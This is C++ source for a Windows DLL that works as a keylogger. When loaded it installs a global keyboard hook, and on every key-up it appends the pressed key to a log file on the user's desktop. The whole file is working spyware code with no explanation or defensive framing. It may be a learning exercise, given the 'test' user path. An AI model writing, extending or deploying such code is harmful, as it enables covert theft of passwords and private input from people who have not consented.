#include "pch.h"



HHOOK hook_handle = nullptr;


void handle_key_event(DWORD keycode)
{
    std::ofstream filename;
    filename.open("C:\\Users\\test\\Desktop\\log.txt", std::ios::app);
    filename << char(keycode) << " ";
    filename.close();
}


LRESULT CALLBACK KeyboardProc(int hook_proc_code, WPARAM event_type, LPARAM event_ptr_param) {
    if (hook_proc_code >= 0)
    {
        if (event_ptr_param & 0x80000000)   //check if keyup
        {
            handle_key_event(event_type);
        }
    }
    return CallNextHookEx(hook_handle, hook_proc_code, event_type, event_ptr_param);
}


BOOL WINAPI DllMain(
    __in HINSTANCE  hInstance,
    __in DWORD      Reason,
    __in LPVOID     Reserved
    )
{        
    switch (Reason)
    {
    case DLL_PROCESS_ATTACH:
        hook_handle = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hInstance, 0);
        break;

    case DLL_PROCESS_DETACH:
        UnhookWindowsHookEx(hook_handle);
        break;
    }

    return TRUE;
}
